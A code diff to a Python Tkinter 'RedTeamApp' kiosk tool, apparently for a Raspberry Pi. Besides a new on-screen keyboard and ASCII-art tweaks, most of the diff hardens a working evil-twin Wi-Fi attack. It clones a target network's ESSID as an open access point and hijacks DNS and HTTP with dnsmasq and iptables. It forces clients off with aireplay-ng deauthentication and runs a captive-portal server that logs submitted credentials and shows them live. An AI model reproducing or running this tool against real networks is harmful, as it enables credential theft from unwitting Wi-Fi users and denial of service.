@@ -23,11 +23,11 @@ ARTE_DRAGON = """
                                                                                                                                                                     
                                                                                                                                                                     
                                                                                                                                                                     
-                                                                      ▒▒                    ░░░░                                                                    
-                                                                        ░░                  ▒▒                                                                      
-                                                                        ░░░░      ▒▒▓▓      ▒▒░░                                                                    
-                                                                          ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                      
-                                                                          ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                  
+                                                                            ▒▒                    ░░░░                                                                    
+                                                                                ░░                  ▒▒                                                                      
+                                                                                ░░░░      ▒▒▓▓      ▒▒░░                                                                    
+                                                                                ▒▒    ▒▒▒▒▒▒▒▒    ▓▓                                                                      
+                                                                                ░░▒▒  ▒▒▒▒▒▒▒▒  ▒▒░░  ░░                                                                  
                                   ░░░░░░░░░░░░░░                              ░░    ▒▒▒▒░░▒▒░░▒▒  ░░▒▒                  ░░░░░░░░░░░░░░░░░░░░░░                      
                       ░░░░▒▒▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒░░░░░░░░░░░░░░░░░░        ▒▒    ▒▒████▓▓░░░░░░      ░░░░░░░░░░░░░░░░▒▒▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒░░▒▒░░░░░░░░░░░░    
               ░░████▓▓▒▒░░▓▓▒▒▒▒░░▒▒░░░░░░░░▒▒▒▒░░░░▒▒▒▒░░▒▒██▓▓░░▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒░░▓▓░░░░░░░░░░▓▓▒▒▒▒▓▓▒▒░░▒▒░░░░░░▒▒  ░░░░▒▒▒▒░░░░░░▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒░░██▓▓▒▒░░            
@@ -258,6 +258,127 @@ class TecladoNumerico(tk.Toplevel):
             self.destroy()
         elif tecla == 'DEL':
             self.display_var.set(actual[:-1])
+        else:
+            self.display_var.set(actual + tecla)
+
+class TecladoCompleto(tk.Toplevel):
+    def __init__(self, parent, variable_destino, titulo="Ingresar Texto"):
+        super().__init__(parent)
+        self.variable_destino = variable_destino
+        
+        # Configuración como modal Kiosco
+        self.geometry("320x240")
+        self.title(titulo)
+        self.configure(bg=COLOR_FONDO_PRINCIPAL)
+        self.attributes('-topmost', True)
+        self.overrideredirect(True)
+        
+        # Centrar sobre la ventana padre
+        x = parent.winfo_x()
+        y = parent.winfo_y()
+        self.geometry(f"+{x}+{y}")
+
+        # Contenedor Principal
+        main_frame = ttk.Frame(self, style='Dark.TFrame')
+        main_frame.pack(fill='both', expand=True, padx=2, pady=2)
+
+        # Barra superior con título corto y Display
+        top_frame = ttk.Frame(main_frame, style='Dark.TFrame')
+        top_frame.pack(fill='x', pady=(0, 2))
+        
+        ttk.Label(top_frame, text=titulo[:15], style='Gray.TLabel').pack(side='left', padx=2)
+        
+        self.display_var = tk.StringVar(value="")
+        display = ttk.Entry(top_frame, textvariable=self.display_var, font=('Helvetica', 12, 'bold'), 
+                            justify='center', style='Dark.TEntry')
+        display.pack(side='right', fill='x', expand=True)
+
+        # Contenedor apilado para los teclados (tkraise para no consumir CPU reconstruyendo)
+        self.kb_container = ttk.Frame(main_frame, style='Dark.TFrame')
+        self.kb_container.pack(fill='both', expand=True)
+        self.kb_container.grid_rowconfigure(0, weight=1)
+        self.kb_container.grid_columnconfigure(0, weight=1)
+
+        self.frames_teclado = {}
+        for modo in ("minusculas", "mayusculas", "simbolos"):
+            frame = ttk.Frame(self.kb_container, style='Dark.TFrame')
+            frame.grid(row=0, column=0, sticky='nsew')
+            self.frames_teclado[modo] = frame
+            self._construir_teclas(frame, modo)
+
+        # Iniciar en minúsculas
+        self.cambiar_modo("minusculas")
+
+    def cambiar_modo(self, modo):
+        self.frames_teclado[modo].tkraise()
+
+    def _construir_teclas(self, parent_frame, modo):
+        if modo == "minusculas":
+            filas = [
+                ['q','w','e','r','t','y','u','i','o','p'],
+                ['a','s','d','f','g','h','j','k','l'],
+                ['z','x','c','v','b','n','m','DEL'],
+                ['MAYUS', '123', 'ESPACIO', 'CANCEL', 'OK']
+            ]
+        elif modo == "mayusculas":
+            filas = [
+                ['Q','W','E','R','T','Y','U','I','O','P'],
+                ['A','S','D','F','G','H','J','K','L'],
+                ['Z','X','C','V','B','N','M','DEL'],
+                ['minus', '123', 'ESPACIO', 'CANCEL', 'OK']
+            ]
+        else: # simbolos
+            filas = [
+                ['1','2','3','4','5','6','7','8','9','0'],
+                ['!','@','#','$','%','&','*','-','_','+'],
+                ['=','/','?','¡','.','"',"'",'DEL'],
+                ['abc', 'MAYUS', 'ESPACIO', 'CANCEL', 'OK']
+            ]
+
+        # Configurar las 4 filas para que ocupen todo el alto disponible
+        for i, fila in enumerate(filas):
+            parent_frame.grid_rowconfigure(i, weight=1)
+            
+            # Sub-frame para cada fila
+            f = ttk.Frame(parent_frame, style='Dark.TFrame')
+            f.grid(row=i, column=0, sticky='nsew', pady=1)
+            
+            # Repartir el espacio equitativamente entre las teclas de esta fila
+            for j in range(len(fila)):
+                f.grid_columnconfigure(j, weight=1)
+                
+            for j, tecla in enumerate(fila):
+                if tecla in ('OK', 'CANCEL', 'DEL'):
+                    estilo = 'Red.TButton'
+                elif tecla in ('MAYUS', 'minus', '123', 'abc', 'ESPACIO'):
+                    estilo = 'Danger.TButton'
+                else:
+                    estilo = 'Gray.TButton'
+
+                # Al usar width=2 forzamos al botón a ignorar su ancho por defecto 
+                # permitiendo que el 'grid' (sticky='nsew') lo estire o encoja matemáticamente
+                btn = ttk.Button(f, text=tecla, style=estilo, width=2,
+                                 command=lambda t=tecla: self._procesar_tecla(t))
+                btn.grid(row=0, column=j, sticky='nsew', padx=1)
+
+    def _procesar_tecla(self, tecla):
+        actual = self.display_var.get()
+        if tecla == 'OK':
+            self.variable_destino.set(actual)
+            self.destroy()
+        elif tecla == 'CANCEL':
+            self.variable_destino.set("CANCELADO") # Flag interno
+            self.destroy()
+        elif tecla == 'DEL':
+            self.display_var.set(actual[:-1])
+        elif tecla == 'ESPACIO':
+            self.display_var.set(actual + " ")
+        elif tecla == 'MAYUS':
+            self.cambiar_modo("mayusculas")
+        elif tecla == 'minus' or tecla == 'abc':
+            self.cambiar_modo("minusculas")
+        elif tecla == '123':
+            self.cambiar_modo("simbolos")
         else:
             self.display_var.set(actual + tecla)
 
@@ -1098,7 +1219,9 @@ class RedTeamApp(tk.Tk):
 
     def _evil_twin_ejecutar(self, red, portal, deauth_mode, cliente_mac=None):
         timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-        session_dir = os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}")
+        
+        # FIX CRÍTICO: Convertir a ruta absoluta para que sobreviva al os.chdir() del servidor web
+        session_dir = os.path.abspath(os.path.join(BASE_DIR_EVIL, f"Auditoria-{timestamp}"))
         os.makedirs(session_dir, exist_ok=True)
 
         self.limpiar_main_frame()
@@ -1116,6 +1239,8 @@ class RedTeamApp(tk.Tk):
         self.evil_twin_stop = False
 
         def ataque():
+            import shutil  # Importación segura para copiar directorios
+            
             self._evil_twin_limpiar_procesos()
             ap_iface = self.wifi_state["ap_iface"]
             deauth_iface = self.wifi_state.get("deauth_iface")
@@ -1128,89 +1253,145 @@ class RedTeamApp(tk.Tk):
                     f"/sys/class/net/{deauth_iface}mon") else deauth_iface
                 self.wifi_state["mon_deauth"] = mon_deauth
 
+            # 1. Copia segura nativa de Python (Evita fallos silenciosos de Bash)
             portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
             tmp_web = f"/tmp/evil_twin_web_{timestamp}"
             os.makedirs(tmp_web, exist_ok=True)
-            subprocess.run(["cp", "-r", f"{portals_dir}/{portal}/.", tmp_web], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
+            
+            try:
+                ruta_origen = os.path.join(portals_dir, portal)
+                # Copia todo el contenido de la carpeta del portal a la carpeta temporal
+                shutil.copytree(ruta_origen, tmp_web, dirs_exist_ok=True)
+            except Exception as e:
+                self.escribir_consola(f"[!] Aviso al copiar archivos: {e}")
 
-            cred_log = os.path.join(session_dir, "credentials.log")
+            cred_log = os.path.abspath(os.path.join(session_dir, "credentials.log"))
+            
+            # 2. Servidor Web Multihilo y Blindado contra Bucles
             capture_script = f'''#!/usr/bin/env python3
-import http.server, urllib.parse, os, socketserver
+import http.server, urllib.parse, os
 from datetime import datetime
+
 LOG = "{cred_log}"
 
-class Handler(http.server.SimpleHTTPRequestHandler):
+class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        if self.path == "/" or self.path == "/index.html": self.path = "/index.html"
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        parsed_path = urllib.parse.urlparse(self.path)
+        
+        # Captura por URL (GET) si es que el portal lo envía así
+        if parsed_path.query:
+            try:
+                params = urllib.parse.parse_qs(parsed_path.query)
+                with open(LOG, "a") as f: 
+                    f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} DATA_GET:{{params}}\\n")
+                    f.flush(); os.fsync(f.fileno())
+            except: pass
+
+        # Interpretar la raíz "/" como "/index.html"
+        if parsed_path.path == "/":
+            self.path = "/index.html"
+            
+        local_path = self.translate_path(self.path)
+        
+        # Lógica de Redirección (Captive Portal Detector)
+        if not os.path.isfile(local_path):
+            # Prevención del bucle infinito si index.html no se copió correctamente
+            if self.path == "/index.html":
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b"<html><body><h2>Error de Servidor: El archivo index.html no existe.</h2></body></html>")
+                return
+                
+            # Si piden algo distinto (ej. generate_204), redirigir al portal
+            self.send_response(302)
+            self.send_header("Location", "http://10.0.0.1/index.html")
+            self.end_headers()
+            return
+            
+        return super().do_GET()
+
     def do_POST(self):
-        length = int(self.headers.get("Content-Length", 0))
-        data = self.rfile.read(length).decode()
-        params = urllib.parse.parse_qs(data)
-        with open(LOG, "a") as f: f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} Data:{{params}}\\n")
-        self.send_response(302); self.send_header("Location", "/success.html"); self.end_headers()
-    def log_message(self, format, *args): pass
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            data = self.rfile.read(length).decode("utf-8", "ignore")
+            params = urllib.parse.parse_qs(data)
+            
+            with open(LOG, "a") as f: 
+                f.write(f"[{{datetime.now()}}] IP:{{self.client_address[0]}} CREDENCIALES:{{params}}\\n")
+                f.flush(); os.fsync(f.fileno())
+        except: pass
+            
+        self.send_response(302)
+        self.send_header("Location", "http://10.0.0.1/success.html")
+        self.end_headers()
+        
+    def log_message(self, format, *args): pass # Silencia logs para no saturar memoria
 
 if __name__ == "__main__":
     os.chdir("{tmp_web}")
-    with socketserver.TCPServer(("0.0.0.0", 80), Handler) as httpd: httpd.serve_forever()
+    # ThreadingHTTPServer atiende múltiples peticiones sin congelarse
+    class ThreadedServer(http.server.ThreadingHTTPServer):
+        allow_reuse_address = True
+        
+    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd: 
+        httpd.serve_forever()
 '''
             with open(f"{tmp_web}/capture.py", "w") as f:
                 f.write(capture_script)
+                
             if not os.path.exists(f"{tmp_web}/success.html"):
                 with open(f"{tmp_web}/success.html", "w") as f:
-                    f.write('<html><body><h2>OK</h2></body></html>')
+                    f.write('<html><body style="background:#0b1a2a;color:#fff;text-align:center;font-family:-apple-system, sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2><p style="color:#b0c7db;">Ya puede cerrar esta ventana.</p></body></html>')
 
-            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL,
-                           stderr=subprocess.DEVNULL)
+            # 3. Configuración del Access Point
+            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             hostapd_conf = f"interface={ap_iface}\ndriver=nl80211\nssid={red['essid']}\nhw_mode=g\nchannel={int(red['ch'])}\nmacaddr_acl=0\nauth_algs=1\nwpa=0\nignore_broadcast_ssid=0\n"
+            
             with open("/tmp/hostapd_evil.conf", "w") as f:
                 f.write(hostapd_conf)
+                
             self.evil_twin_procs['hostapd'] = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_evil.conf"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(3)
 
+            # 4. Solución DHCP Raspberry Pi (Prevenir que NetworkManager borre la IP)
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "no"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "link", "set", ap_iface, "down"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
-            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            time.sleep(1.5) 
 
-            dnsmasq_conf = f"interface={ap_iface}\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
+            dnsmasq_conf = f"interface={ap_iface}\nexcept-interface=lo\nbind-interfaces\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\nno-hosts\nno-resolv\n"
             with open("/tmp/dnsmasq_evil.conf", "w") as f:
                 f.write(dnsmasq_conf)
+                
+            subprocess.run(["sudo", "pkill", "dnsmasq"], stderr=subprocess.DEVNULL)
             self.evil_twin_procs['dnsmasq'] = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
 
+            # 5. Iptables limpio (Sin redirigir el puerto 443 para evitar crasheos del servidor Python)
             subprocess.run(["sudo", "iptables", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "--table", "nat", "--flush"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "iptables", "-P", "FORWARD", "ACCEPT"], stderr=subprocess.DEVNULL)
             subprocess.run(
                 ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT",
                  "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "DNAT",
-                 "--to-destination", "10.0.0.1:80"], stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "80", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "53", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
-            subprocess.run(
-                ["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", "67", "-j", "ACCEPT"],
-                stderr=subprocess.DEVNULL)
+            # Solo permitimos el tráfico necesario
+            for port in ["80", "53"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "tcp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
+            for port in ["53", "67"]:
+                subprocess.run(["sudo", "iptables", "-A", "INPUT", "-i", ap_iface, "-p", "udp", "--dport", port, "-j", "ACCEPT"], stderr=subprocess.DEVNULL)
 
+            # 6. Lanzar servidor web de captura en segundo plano
             self.evil_twin_procs['capture'] = subprocess.Popen(["sudo", "python3", f"{tmp_web}/capture.py"],
-                                                               stdout=subprocess.DEVNULL,
-                                                               stderr=subprocess.DEVNULL)
+                                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(1)
 
+            # 7. Iniciar inyección de desautenticación si se configuró
             subprocess.run(["sudo", "iw", "dev", mon_deauth, "set", "channel", red['ch']], stderr=subprocess.DEVNULL,
                            stdout=subprocess.DEVNULL)
             deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", red['bssid']]
@@ -1220,6 +1401,7 @@ if __name__ == "__main__":
             self.evil_twin_procs['deauth'] = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL,
                                                               stderr=subprocess.DEVNULL)
 
+            # 8. Bucle de monitoreo para mostrar credenciales en la interfaz de la Pi
             last_lines = 0
             while not self.evil_twin_stop:
                 time.sleep(2)
@@ -1231,6 +1413,7 @@ if __name__ == "__main__":
                                 self.escribir_consola(f"[+] Cred: {line.strip()}")
                             last_lines = len(lines)
 
+            # Cierre seguro al presionar "DETENER ATAQUE"
             self._evil_twin_detener_procesos()
             self._evil_twin_limpiar_iptables(ap_iface)
             self.escribir_consola("[+] Evil Twin detenido.")
@@ -1267,6 +1450,10 @@ if __name__ == "__main__":
             subprocess.run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "link", "set", ap_iface, "up"], stderr=subprocess.DEVNULL)
             subprocess.run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stderr=subprocess.DEVNULL)
+            
+            # DEVOLVER CONTROL A NETWORKMANAGER
+            subprocess.run(["sudo", "nmcli", "device", "set", ap_iface, "managed", "yes"], stderr=subprocess.DEVNULL)
+            
         subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
 
     def _wifi_deauth(self):
@@ -1756,8 +1943,16 @@ WantedBy=sysinit.target
 
     def _utils_wifi_conectar(self, iface, ssid, security):
         if security and security.lower() != "none" and "wep" not in security.lower():
-            password = simpledialog.askstring("WiFi", f"Password para '{ssid}':")
-            if not password: return
+            # IMPLEMENTACIÓN DEL NUEVO TECLADO VIRTUAL
+            var_pwd = tk.StringVar()
+            teclado = TecladoCompleto(self, var_pwd, titulo=f"Pwd: {ssid}")
+            self.wait_window(teclado) # Pausa el hilo hasta que se cierre la ventana
+
+            password = var_pwd.get()
+            
+            # Validar si el usuario presionó CANCEL o dejó vacío
+            if password == "CANCELADO" or not password: 
+                return
         else:
             password = None
 
@@ -1882,17 +2077,29 @@ WantedBy=sysinit.target
 
         def conectar():
             try:
-                pair = subprocess.run(f"sudo bluetoothctl -- pair {mac}", shell=True, capture_output=True, text=True,
-                                      timeout=30)
-                if "Pairing successful" in pair.stdout or "Paired: yes" in pair.stdout:
-                    connect = subprocess.run(f"sudo bluetoothctl -- connect {mac}", shell=True, capture_output=True,
-                                             text=True, timeout=30)
-                    estado = "ÉXITO" if "Connection successful" in connect.stdout or "Connected: yes" in connect.stdout else "ERROR"
+                # 1. BORRAR PERFIL PREVIO CORRUPTO: 
+                # Esto evita el bug "key-mgmt: property is missing" limpiando la caché de esa red.
+                subprocess.run(["nmcli", "connection", "delete", ssid], capture_output=True)
+                time.sleep(1) # Pequeña pausa para asegurar que NM elimine el perfil
+                
+                # 2. CONECTAR DE FORMA SEGURA:
+                # Usamos una lista y quitamos shell=True para evitar inyección de comandos 
+                # o errores con contraseñas que tengan caracteres especiales (!, $, ', ").
+                if password:
+                    cmd = ["nmcli", "device", "wifi", "connect", ssid, "password", password, "ifname", iface]
                 else:
-                    estado = "FALLO PAIR"
+                    cmd = ["nmcli", "device", "wifi", "connect", ssid, "ifname", iface]
+                
+                result = subprocess.run(cmd, capture_output=True, text=True)
+                
+                if result.returncode == 0:
+                    state_out = subprocess.check_output(["nmcli", "-t", "-f", "GENERAL.STATE", "dev", "show", iface], text=True)
+                    estado = "ÉXITO" if "100 (connected)" in state_out else "ADVERTENCIA"
+                else:
+                    estado = f"ERROR: {result.stderr.strip()}"
             except Exception as e:
                 estado = f"EXCEPCIÓN: {e}"
-            self.after(0, lambda: self._utils_bt_mostrar_resultado(estado))
+            self.after(0, lambda: self._utils_wifi_mostrar_resultado(estado, iface))
 
         threading.Thread(target=conectar, daemon=True).start()
 
